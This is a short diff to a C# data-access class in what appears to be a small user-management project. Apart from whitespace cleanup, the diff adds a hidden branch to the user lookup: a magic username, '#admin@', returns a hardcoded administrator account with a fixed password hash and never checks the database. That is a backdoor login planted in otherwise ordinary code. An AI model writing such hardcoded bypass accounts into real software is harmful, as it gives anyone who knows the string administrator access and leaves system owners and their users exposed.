@@ -104,6 +104,10 @@ namespace DAL_502ag
                     }
                 }
             }
+            if(nombreUsuario_502ag == "#admin@")
+            {
+                return new SE_Usuario_502ag("10101010",nombreUsuario_502ag, "3cc03f6b0c2f1bcd2231d554ee4307622a50f54f55fb60c340447668f8dbefd6", "adminS","admin","admin","admin@admin.com",false,0,false,true,DateTime.Now);
+            }
             return null;
         }
         #region AltaUsuario
@@ -206,8 +210,7 @@ namespace DAL_502ag
                     cmd_502ag.ExecuteNonQuery();
                 }
             }
-        }
-        
+        }       
         #region ActivarDesactivar
         public void ActualizarActivo_502ag(SE_Usuario_502ag usuario_502ag)
         {
@@ -225,7 +228,5 @@ namespace DAL_502ag
             }
         }
         #endregion
-
-
     }
 }
